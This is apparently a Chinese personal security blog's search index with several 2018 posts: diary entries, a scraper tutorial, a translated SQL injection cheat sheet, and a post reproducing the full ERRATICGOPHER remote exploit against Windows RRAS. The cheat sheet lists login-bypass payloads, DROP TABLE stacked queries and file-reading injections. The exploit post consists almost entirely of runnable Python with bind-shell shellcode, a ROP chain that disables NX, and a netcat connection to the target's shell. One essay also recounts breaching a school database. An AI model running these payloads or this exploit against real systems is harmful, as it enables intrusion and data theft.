    </entry>
    
    <entry>
      <title>日常心路-180909</title>
      <link href="/2018/09/09/daily-life-20180909/"/>
      <url>/2018/09/09/daily-life-20180909/</url>
      <content type="html"><![CDATA[<p>最近忙了很多事，从公司离职，搬家，开学，又跑到某市做培训。</p><p>突然回到校园生活，身份从社会人变成学生，感觉还有点不适应。</p><p>今天，如愿以偿的通过了<code>Syclover</code>的面试，进入了新芽组，应该是唯一一个大三的新芽 ( ╯□╰ )，不过也算是完成了高中时候的心愿（进入CUIT，进入Syclover）。今天面的师傅很严肃，感觉自己确实还差的太多了，希望能在这个学期努力跟上。</p><p>这个学期，需要额外补<code>3</code>门课，把四级过了，还要尽量通过核心组面试，任务挺重的⊙﹏⊙∥。</p><p>诸君共勉吧(ﾉ*･ω･)ﾉ。</p><p><img src="/2018/09/09/daily-life-20180909/jldnydhgjxzpmdzj.jpg" alt="表情"></p>]]></content>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
            <tag> 心路 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SQL注入备忘录</title>
      <link href="/2018/08/07/sql-injection-cheat-sheet/"/>
      <url>/2018/08/07/sql-injection-cheat-sheet/</url>
      <content type="html"><![CDATA[<p>转自：<a href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/" target="_blank" rel="noopener">https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/</a></p><h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><h3 id="单行注释"><a href="#单行注释" class="headerlink" title="单行注释"></a>单行注释</h3><ul><li><p><code>--</code> (MySQL | SQLServer)</p><p>DROP sample; –</p></li><li><p><code>#</code> (MySQL)</p><p>DROP sample; #</p></li></ul><h4 id="Sample"><a href="#Sample" class="headerlink" title="Sample"></a>Sample</h4><ul><li><p>Username: admin’–</p></li><li><p>SELECT * FROM members WHERE username = ‘admin’–’ AND password = ‘password’ </p></li></ul><h3 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h3><p>  注释掉查询的多余部分，而不是直接截断关闭，可以通过这种方法绕过黑名单、替代空格，混淆，检测数据库版本。</p><ul><li><p>/*Comment Here*/ (MySQL | SQL Server)</p><pre><code>1. DROP/*comment*/sampletable2. DR/**/OP/*bypass blacklisting*/sampletable3. SELECT/*avoid-spaces*/password/**/FROM/**/Members</code></pre></li><li><p>/*! MySQL Special SQL */ (MySQL) </p><p>   这是MySQL特有的语法，可以用来检测数据库版本，如果在注释中注入代码，它会在数据库中被执行。 </p><ol><li>SELECT /<em>!32302 1/0, </em>/ 1 FROM tablename</li></ol></li></ul><h4 id="Sample-1"><a href="#Sample-1" class="headerlink" title="Sample"></a>Sample</h4><ul><li><p>ID: 10; DROP TABLE members /* </p></li><li><p>SELECT /*!32302 1/0, */ 1 FROM tablename </p><p>如果数据库版本大于<code>3.23.02</code>会报错。</p></li></ul><h2 id="堆叠查询"><a href="#堆叠查询" class="headerlink" title="堆叠查询"></a>堆叠查询</h2><p>  可以在一次事务中，执行多个查询。</p><ul><li><p><code>;</code> (SQL Server)</p><p>SELECT * FROM members; DROP members–</p></li></ul><h2 id="If-语句"><a href="#If-语句" class="headerlink" title="If 语句"></a>If 语句</h2><p>  通过IF语句，判断响应的内容，可以进行盲注。</p><h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><ul><li><p>IF(condition,true-part,false-part) </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">IF</span>(<span class="number">1</span>=<span class="number">1</span>,<span class="string">'true'</span>,<span class="string">'false'</span>)</span><br></pre></td></tr></table></figure></li></ul><h3 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL Server"></a>SQL Server</h3><ul><li><p>IF condition true-part ELSE false-part</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IF (1=1) <span class="keyword">SELECT</span> <span class="string">'true'</span> <span class="keyword">ELSE</span> <span class="keyword">SELECT</span> <span class="string">'false'</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h3>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">IF</span> condition <span class="keyword">THEN</span> <span class="literal">true</span>-part; </span><br><span class="line">ELSE false-part;</span><br><span class="line"><span class="keyword">END</span> <span class="keyword">IF</span>;</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line"></span><br><span class="line">IF (1=1) THEN dbms_lock.sleep(3);</span><br><span class="line">ELSE dbms_lock.sleep(0);</span><br><span class="line"><span class="keyword">END</span> <span class="keyword">IF</span>;</span><br><span class="line"><span class="keyword">END</span>;</span><br></pre></td></tr></table></figure><h3 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h3>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> condition <span class="keyword">THEN</span> <span class="literal">true</span>-part <span class="keyword">ELSE</span> <span class="literal">false</span>-part <span class="keyword">END</span>;</span><br></pre></td></tr></table></figure>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CASE</span> WEHEN (<span class="number">1</span>=<span class="number">1</span>) <span class="keyword">THEN</span> <span class="string">'A'</span> <span class="keyword">ELSE</span> <span class="string">'B'</span><span class="keyword">END</span>;</span><br></pre></td></tr></table></figure><h4 id="Sample-2"><a href="#Sample-2" class="headerlink" title="Sample"></a>Sample</h4>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ((<span class="keyword">select</span> <span class="keyword">user</span>) = <span class="string">'sa'</span> <span class="keyword">OR</span> (<span class="keyword">select</span> <span class="keyword">user</span>) = <span class="string">'dbo'</span>) <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">else</span> <span class="keyword">select</span> <span class="number">1</span>/<span class="number">0</span> (S)</span><br></pre></td></tr></table></figure><p>  如果当前账号不是<code>sa</code>或<code>dbo</code>，会报 <code>divide by zero error</code>错误。</p><h2 id="使用整型"><a href="#使用整型" class="headerlink" title="使用整型"></a>使用整型</h2><p>  可以用来绕过<code>magic_quotes()</code>等过滤器，甚至是<code>WAF</code></p><ul><li><p>0xHEXNUMBER (MySQL | SQL Server)<br>You can  write hex like these; </p></li><li><p>SELECT CHAR(0x66) (SQL Server) </p></li><li><p>SELECT 0x5045 (这里不是数值，而是从hex转换来的字符) (MySQL) </p></li><li><p>SELECT 0x50 + 0x45 (这里是数值) (MySQL)</p></li></ul><h2 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h2><h3 id="字符串连接"><a href="#字符串连接" class="headerlink" title="字符串连接"></a>字符串连接</h3><ul><li><p><code>+</code> (SQL Server)</p><p>SELECT login + ‘-‘ + password FROM members</p></li><li><p><code>||</code> (MySQL | Oracle)</p><p>SELECT login || ‘-‘ || password FROM members</p><pre><code>如果MySQL在ANSI模式下运行，它被当作逻辑运算符，而返回0。更好的方法是，使用 CONCAT()</code></pre></li></ul><ul><li><p>CONCAT(str1,str2,…) (MySQL)</p><p>SELECT CONCAT(login, password) FROM members</p></li></ul><h2 id="无引号字符串"><a href="#无引号字符串" class="headerlink" title="无引号字符串"></a>无引号字符串</h2><ul><li><p>0x457578 (MySQL)</p><p>SELECT 0x457578</p><p>这里的十六进制数字会返回一个字符串。</p><p>MySQL有HEX()函数，可以生成hex，像下面一样。</p><p>SELECT CONCAT(‘0x’,HEX(‘c:\boot.ini’))</p></li><li><p>SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77)) (MySQL) </p><p>将会返回’KLM’</p></li><li><p>SELECT CHAR(75)+CHAR(76)+CHAR(77) (SQL Server) </p><p>将会返回’KLM’</p></li><li><p>SELECT CHR(75)||CHR(76)||CHR(77) (Oracle) </p><p>将会返回’KLM’</p></li><li><p>SELECT (CHaR(75)||CHaR(76)||CHaR(77)) (Postgresql) </p><p>将会返回’KLM’</p></li></ul><h4 id="Samples"><a href="#Samples" class="headerlink" title="Samples"></a>Samples</h4><p>  SELECT LOAD_FILE(0x633A5C626F6F742E696E69) (MySQL) </p><p>  This will show the content of c:\boot.ini</p><h2 id="字符串修改"><a href="#字符串修改" class="headerlink" title="字符串修改"></a>字符串修改</h2><ul><li><p>ASCII() (SQL Server | MySQL | Postgresql)</p><p>返回字符的ASCII码</p></li><li><p>CHAR() (SQL Server | MySQL)</p><p>返回ASCII码对应的字符</p></li></ul><h2 id="UNION-联合查询注入"><a href="#UNION-联合查询注入" class="headerlink" title="UNION 联合查询注入"></a>UNION 联合查询注入</h2><p>  可以通过<code>unin</code>进行跨表查询。</p><pre><code>1. SELECT header, txt FROm news UNION ALL SELECT name, pass FROM members2. &apos; UNION SELECT 1, &apos;anotheruser&apos;, &apos;doesnt matter&apos;, 1--</code></pre><h3 id="UNION-关于语言的问题的修复"><a href="#UNION-关于语言的问题的修复" class="headerlink" title="UNION - 关于语言的问题的修复"></a>UNION - 关于语言的问题的修复</h3><p>  在使用联合注入时，有时会因为不同的语言设置（表设置、字段设置、组合表/db设置等）而出现错误。这不常见，但如果你处理的是日语、俄语、土耳其语等应用，你就会遇到它。</p><ul><li><p>SQL Server</p><p>使用 <code>field</code> <strong><code>COLLATE</code></strong> <code>SQL_Latin1_General_Cp1254_CS_AS</code> 或其它有效参数</p></li><li><p>MySQL</p><p><code>Hex()</code></p></li></ul><h2 id="绕过登录点"><a href="#绕过登录点" class="headerlink" title="绕过登录点"></a>绕过登录点</h2><p>可以尝试以下：</p><ul><li><p>admin’ –</p></li><li><p>admin’ #</p></li><li><p>admin’/*</p></li><li><p>‘ or 1=1–</p></li><li><p>‘ or 1=1#</p></li><li><p>‘ or 1=1/*</p></li><li><p>‘) or ‘1’=’1–</p></li><li><p>‘) or (‘1’=’1–c</p></li><li><p>登录到其它用户 (MySQL | SQL Server)</p><p>‘ UNION SELECT 1, ‘anotheruser’, ‘doesnt matter’, 1–</p></li></ul><h2 id="绕过密码MD5验证的登录点"><a href="#绕过密码MD5验证的登录点" class="headerlink" title="绕过密码MD5验证的登录点"></a>绕过密码MD5验证的登录点</h2><p>  可以通过联合查询，提交一个已知密码的MD5，这时候，数据库会优先比较你提交的MD5，从而绕过登录。</p><blockquote><p>Username :<br>admin’ AND 1=0 UNION ALL SELECT ‘admin’, ‘81dc9bdb52d04dc20036dbd8313ed055’</p></blockquote><blockquote><p>Password : 1234</p></blockquote><h2 id="通过报错发现字段名"><a href="#通过报错发现字段名" class="headerlink" title="通过报错发现字段名"></a>通过报错发现字段名</h2><h3 id="使用-HAVING-BY-MySQL"><a href="#使用-HAVING-BY-MySQL" class="headerlink" title="使用 HAVING BY (MySQL)"></a>使用 <code>HAVING BY</code> (MySQL)</h3><ul><li>‘ HAVING 1=1 –</li><li>‘ GROUP BY table.columnfromerror1 HAVING 1=1 –</li><li>‘ GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 –</li><li>‘ GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 – 依次类推</li></ul><h3 id="使用-ORDER-BY"><a href="#使用-ORDER-BY" class="headerlink" title="使用 ORDER BY (*)"></a>使用 <code>ORDER BY</code> (*)</h3>]]></content>
      
      
        <tags>
            
            <tag> sql-injection </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>远程溢出之古怪地鼠ERRATICGOPHER</title>
      <link href="/2018/08/02/exploit-erraticgopher/"/>
      <url>/2018/08/02/exploit-erraticgopher/</url>
      <content type="html"><![CDATA[<p>ERRATICGOPHER是NSA泄露的针对<code>RRAS（Routing and Remote Access Service）</code>服务的攻击程序，影响<code>Windows XP</code> <code>Windows 2003</code>，此漏洞在<code>Vista</code>发布之前已经被修复。</p><p>附<code>EXPLOIT</code>，来自<a href="https://github.com/offensive-security/exploit-database/blob/d304cc3d3ef22bd6e5bccdeb6c13720345bbfc0c/exploits/windows/remote/41929.py" target="_blank" rel="noopener">exploit-db</a></p><blockquote><p>需要安装<code>impacket</code>模块</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import struct</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">from threading import Thread    </span><br><span class="line">                                </span><br><span class="line">from impacket import smb</span><br><span class="line">from impacket import uuid</span><br><span class="line">from impacket import dcerpc</span><br><span class="line">from impacket.dcerpc.v5 import transport</span><br><span class="line">                </span><br><span class="line">target = sys.argv[1]</span><br><span class="line"></span><br><span class="line">print &apos;[-]Initiating connection&apos;</span><br><span class="line">trans = transport.DCERPCTransportFactory(&apos;ncacn_np:%s[\\pipe\\browser]&apos; % target)</span><br><span class="line">trans.connect()</span><br><span class="line"></span><br><span class="line">print &apos;[-]connected to ncacn_np:%s[\\pipe\\browser]&apos; % target</span><br><span class="line">dce = trans.DCERPC_class(trans)</span><br><span class="line">#RRAS DCE-RPC CALL</span><br><span class="line">dce.bind(uuid.uuidtup_to_bin((&apos;8f09f000-b7ed-11ce-bbd2-00001a181cad&apos;, &apos;0.0&apos;)))</span><br><span class="line"></span><br><span class="line">egghunter = &quot;\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a&quot;</span><br><span class="line">egghunter += &quot;\x74\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7&quot;</span><br><span class="line"></span><br><span class="line">#msfvenom -a x86 --platform windows -p windows/shell_bind_tcp lport=4444 -b &quot;\x00&quot; -f python</span><br><span class="line">buf =  &quot;&quot;</span><br><span class="line">buf += &quot;\xb8\x3c\xb1\x1e\x1d\xd9\xc8\xd9\x74\x24\xf4\x5a\x33&quot;</span><br><span class="line">buf += &quot;\xc9\xb1\x53\x83\xc2\x04\x31\x42\x0e\x03\x7e\xbf\xfc&quot;</span><br><span class="line">buf += &quot;\xe8\x82\x57\x82\x13\x7a\xa8\xe3\x9a\x9f\x99\x23\xf8&quot;</span><br><span class="line">buf += &quot;\xd4\x8a\x93\x8a\xb8\x26\x5f\xde\x28\xbc\x2d\xf7\x5f&quot;</span><br><span class="line">buf += &quot;\x75\x9b\x21\x6e\x86\xb0\x12\xf1\x04\xcb\x46\xd1\x35&quot;</span><br><span class="line">buf += &quot;\x04\x9b\x10\x71\x79\x56\x40\x2a\xf5\xc5\x74\x5f\x43&quot;</span><br><span class="line">buf += &quot;\xd6\xff\x13\x45\x5e\x1c\xe3\x64\x4f\xb3\x7f\x3f\x4f&quot;</span><br><span class="line">buf += &quot;\x32\x53\x4b\xc6\x2c\xb0\x76\x90\xc7\x02\x0c\x23\x01&quot;</span><br><span class="line">buf += &quot;\x5b\xed\x88\x6c\x53\x1c\xd0\xa9\x54\xff\xa7\xc3\xa6&quot;</span><br><span class="line">buf += &quot;\x82\xbf\x10\xd4\x58\x35\x82\x7e\x2a\xed\x6e\x7e\xff&quot;</span><br><span class="line">buf += &quot;\x68\xe5\x8c\xb4\xff\xa1\x90\x4b\xd3\xda\xad\xc0\xd2&quot;</span><br><span class="line">buf += &quot;\x0c\x24\x92\xf0\x88\x6c\x40\x98\x89\xc8\x27\xa5\xc9&quot;</span><br><span class="line">buf += &quot;\xb2\x98\x03\x82\x5f\xcc\x39\xc9\x37\x21\x70\xf1\xc7&quot;</span><br><span class="line">buf += &quot;\x2d\x03\x82\xf5\xf2\xbf\x0c\xb6\x7b\x66\xcb\xb9\x51&quot;</span><br><span class="line">buf += &quot;\xde\x43\x44\x5a\x1f\x4a\x83\x0e\x4f\xe4\x22\x2f\x04&quot;</span><br><span class="line">buf += &quot;\xf4\xcb\xfa\xb1\xfc\x6a\x55\xa4\x01\xcc\x05\x68\xa9&quot;</span><br><span class="line">buf += &quot;\xa5\x4f\x67\x96\xd6\x6f\xad\xbf\x7f\x92\x4e\xae\x23&quot;</span><br><span class="line">buf += &quot;\x1b\xa8\xba\xcb\x4d\x62\x52\x2e\xaa\xbb\xc5\x51\x98&quot;</span><br><span class="line">buf += &quot;\x93\x61\x19\xca\x24\x8e\x9a\xd8\x02\x18\x11\x0f\x97&quot;</span><br><span class="line">buf += &quot;\x39\x26\x1a\xbf\x2e\xb1\xd0\x2e\x1d\x23\xe4\x7a\xf5&quot;</span><br><span class="line">buf += &quot;\xc0\x77\xe1\x05\x8e\x6b\xbe\x52\xc7\x5a\xb7\x36\xf5&quot;</span><br><span class="line">buf += &quot;\xc5\x61\x24\x04\x93\x4a\xec\xd3\x60\x54\xed\x96\xdd&quot;</span><br><span class="line">buf += &quot;\x72\xfd\x6e\xdd\x3e\xa9\x3e\x88\xe8\x07\xf9\x62\x5b&quot;</span><br><span class="line">buf += &quot;\xf1\x53\xd8\x35\x95\x22\x12\x86\xe3\x2a\x7f\x70\x0b&quot;</span><br><span class="line">buf += &quot;\x9a\xd6\xc5\x34\x13\xbf\xc1\x4d\x49\x5f\x2d\x84\xc9&quot;</span><br><span class="line">buf += &quot;\x6f\x64\x84\x78\xf8\x21\x5d\x39\x65\xd2\x88\x7e\x90&quot;</span><br><span class="line">buf += &quot;\x51\x38\xff\x67\x49\x49\xfa\x2c\xcd\xa2\x76\x3c\xb8&quot;</span><br><span class="line">buf += &quot;\xc4\x25\x3d\xe9&quot;</span><br><span class="line"></span><br><span class="line">#NX disable routine for Windows Server 2003 SP2</span><br><span class="line">rop = &quot;\x30\xdb\xc0\x71&quot; #push esp, pop ebp, retn ws_32.dll</span><br><span class="line">rop += &quot;\x45&quot;*16</span><br><span class="line">rop += &quot;\xe9\x77\xc1\x77&quot; #push esp, pop ebp, retn 4 gdi32.dll</span><br><span class="line">rop += &quot;\x5d\x7a\x81\x7c&quot; #ret 20</span><br><span class="line">rop += &quot;\x71\x42\x38\x77&quot; #jmp esp</span><br><span class="line">rop += &quot;\xf6\xe7\xbd\x77&quot; #add esp,2c ; retn msvcrt.dll</span><br><span class="line">rop += &quot;\x90&quot;*2 + egghunter + &quot;\x90&quot;*42</span><br><span class="line">rop += &quot;\x17\xf5\x83\x7c&quot; #Disable NX routine</span><br><span class="line">rop += &quot;\x90&quot;*4</span><br><span class="line"></span><br><span class="line">stub = &quot;\x21\x00\x00\x00\x10\x27\x00\x00\x30\x07\x00\x00\x00\x40\x51\x06\x04\x00\x00\x00\x00\x85\x57\x01\x30\x07\x00\x00\x08\x00\x00\x00&quot; #Magic bytes</span><br><span class="line">stub += &quot;\x41&quot;*20 + rop + &quot;\xCC&quot;*100 + &quot;w00tw00t&quot; + buf + &quot;\x42&quot;*(1313-20-len(rop)-100-8-len(buf))</span><br><span class="line">stub += &quot;\x12&quot; #Magic byte</span><br><span class="line">stub += &quot;\x46&quot;*522</span><br><span class="line">stub += &quot;\x04\x00\x00\x00\x00\x00\x00\x00&quot; #Magic bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dce.call(0x1d, stub)   #0x1d MIBEntryGet (vulnerable function)</span><br><span class="line">print &quot;[-]Exploit sent to target successfully...&quot;</span><br><span class="line"></span><br><span class="line">print &quot;Waiting for shell...&quot;</span><br><span class="line">time.sleep(5)</span><br><span class="line">os.system(&quot;nc &quot; + target + &quot; 4444&quot;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
        <tags>
            
            <tag> EXPLOIT </tag>
            
            <tag> SMB </tag>
            
            <tag> 远程溢出 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>爬虫之批量下载Admin5源码</title>
      <link href="/2018/08/01/crawl-admin5/"/>
      <url>/2018/08/01/crawl-admin5/</url>
      <content type="html"><![CDATA[<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p><a href="http://down.admin5.com" target="_blank" rel="noopener"><code>Admin5</code></a> 提供了各种语言的开源项目，包括<code>asp</code> <code>php</code> <code>.net</code> <code>jsp</code>等。最近开始玩代码审计，到处找项目很麻烦，所以打算写一个爬虫，借助Admin5批量下载各类开源项目。</p><h2 id="分析页面"><a href="#分析页面" class="headerlink" title="分析页面"></a>分析页面</h2><p>首先，分析下<code>Admin5</code>的页面。</p><p><img src="/2018/08/01/crawl-admin5/screenshot-1.png" alt="截图-1"></p><p>可以看到，页面数据直接在html中显示的，并不是JS渲染上去的，这就比较好爬了。在响应的请求中，页面用的是<code>gb2312</code>编码，打印的时候需要注意一下，不然会乱码。建议设置编码为<code>gbk</code>，因为<code>gb2312</code>的支持的字没有<code>gbk</code>多，像打印<code>囧</code>的时候，就会抛异常。</p><p>首页的地址是<code>http://down.admin5.com/php/</code>，往后翻页，再看看首页的地址。</p><p><img src="/2018/08/01/crawl-admin5/screenshot-2.png" alt="截图-2"></p><p>变成了<code>http://down.admin5.com/php/list_30_1.html</code>。</p><p>那么就可以得出页面的地址规则 <code>php/list_30_页码.html</code>。</p><p><img src="/2018/08/01/crawl-admin5/screenshot-3.png" alt="截图-3"></p><p>这里使用<code>XPATH表达式</code>可以很方便的获取页面数据，<code>//div[@class=&quot;lists_bigimg_right&quot;]/a</code>，获取当前页所有项目详情的 <code>a</code> 标签，即详情页的地址。</p><p>随便进入一个项目的详情，找到下载地址。</p><p><img src="/2018/08/01/crawl-admin5/screenshot-4.png" alt="截图-4"></p><p>使用 XPATH : <code>//ul[@class=&quot;down-anniu&quot;]//li/a/@href</code>，获取下载地址，这条XPATH是获取所有的下载点地址，实际用不到这么多，可以修改下 <code>//ul[@class=&quot;down-anniu&quot;]/li[1]/a/@href</code>，只获取1条。</p><p>当然，这个页面还包含了其它的数据，同样可以用 XPATH 采集，就不详细写了，后面在代码中会有。</p><h2 id="运行流程"><a href="#运行流程" class="headerlink" title="运行流程"></a>运行流程</h2><p>下面梳理下我们爬虫的运行流程。</p><ol><li><p>访问<code>http://down.admin5.com/php/</code>，<code>asp</code>,<code>.net</code>等语言项目的页面其实是一样的，改下路径就行，这里以<code>php</code>的为例。</p></li><li><p>获取后续页面的地址，即下一页。由于<code>Admin5</code>的页面比较简单，可以直接获取总页数，然后用<code>for</code>循环，遍历<code>http://down.admin5.com/php/list_30_页码.html</code>。</p></li><li><p>获取每个项目的详细页地址，并跟进。</p></li><li><p>提取项目的详细参数，获取下载地址，加入下载队列。</p></li><li><p>下载模块不断取出队列的任务，下载项目，直到队列为空。</p></li></ol><h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><p>这个项目比较简单，所以没有用<code>scrapy</code>等很重的框架去做。就用最简单的<code>requests</code>库去实现，下面设计一下具体的业务模型。</p><h3 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h3><ol><li>ProjectItem<ul><li>name</li><li>size</li><li>update_date</li><li>official_url</li><li>download_url</li></ul></li></ol><p>这个模型包含每个项目的属性，包括项目名称，大小，更新日期，官方地址，下载地址。</p><ol start="2"><li>Downloader<ul><li>download_queue</li><li>cache_path</li><li>save_path</li><li>add_task(projcet_item)</li><li>print_progress()</li><li>save_cache()</li></ul></li></ol><p>下载器，这个模型负责下载项目，维护下载队列，监控下载进度，并对下载过的项目地址做缓存，防止重复下载。</p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><p>已上传到 <a href="https://github.com/CHN-Jaylin/Spider/tree/master/admin5" target="_blank" rel="noopener">Github</a>， 具体实现请查看代码，注释已经写的比较清楚了。</p><h4 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h4><p><img src="/2018/08/01/crawl-admin5/screenshot-5.png" alt="截图-5"></p><p>已经实现了自动保存下载进度，可以随时<code>Ctrl+C</code>退出程序，下次执行时会跳过已下载的项目。</p>]]></content>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>昨天，明天</title>
      <link href="/2018/07/31/yesterday-and-tomorrow/"/>
      <url>/2018/07/31/yesterday-and-tomorrow/</url>
      <content type="html"><![CDATA[<p>在二零一八年七月的尾巴，写下这篇文章。算是对过去的一个回忆总结，还有未来的计划。</p><p>做安全，是我高中时候就有的想法。那个时候WooYun还在，我还记得曾经挖到一个小厂的任意用户密码重置的漏洞，注册了第一个账号，踏上了我在安全路上的第一步。</p><p>高中的时候住校，手机查的还严。每天最开心的就是窝在被子里，翻着WooYun，逛逛Zone。看看今天谁家Struts2的洞还没补，哪个厂的裤子又被脱了。当然，还有各路大佬分享的奇技淫巧，一哥猪猪侠，画漫画的小川……</p><p>大学，我来到离家1500KM的成都，因为各种原因，选了一个不喜欢的专业，加了学生会，每天都让自己很忙，常常是通宵在工作，也没有时间再去关注安全圈。第一个学期的学期末，重要的几门专业基础课还是都不懂。我意识到这个专业真的不适合我，即使毕业了，我也不会去做这行。某个晚上，我扯出路由器上的网线，连上学校内网，拿下了支撑学校核心业务的数据库。表里，挂掉的两科静静的躺在那，只要我敲下键盘，就是全班最佳。思考了许久，还是关掉了终端。理智战胜了贪欲，假的永远不会真，做了假，就要每天担心谎言会在哪天被拆穿。</p><p>第二个学期，不顾家人反对，我转到了软件专业，学习软件开发。环境原因，班上的计算机水平都不行，凭着高中攒下的知识，吊打全专业。不过这没什么好比的，格局要大。我开始参加各种比赛，移动开发，大数据，软件杯。一路过来，经历了很多，承担了很多，收获了很多，可以说是我人生成长最多的历程。在这里，我迷失过，特别是我深入开发之后，我发现IT的方向原来这么多，我对每个方向都感兴趣，但一个人不可能把每条路走通，必须找一条合适自己路。开发这条路，我走了很久，也做过自己引以为傲的作品。不过我不喜欢做业务，像是搬砖一样的堆砌代码，写没有灵魂的程序，所以，是时候回去了。</p><p>这一年，最开心的事莫过于通过升本考试，接下来的两年，我将在CUIT继续学习。CUIT最出名的，就是信息安全了吧，也是牛人云集的地方。希望多年以后，再看这篇文章的时候，我也是一枚大佬了。</p><p>不忘初心，方得始终。</p>]]></content>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
            <tag> 心路 </tag>
            
        </tags>
      
    </entry>
    
  
  
    
    <entry>
      <title>tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      <content type="html"><![CDATA[]]></content>
    </entry>
    
    <entry>
      <title>timeline</title>
      <link href="/timeline/index.html"/>
      <url>/timeline/index.html</url>
      <content type="html"><![CDATA[]]></content>
    </entry>
    
  
</search>
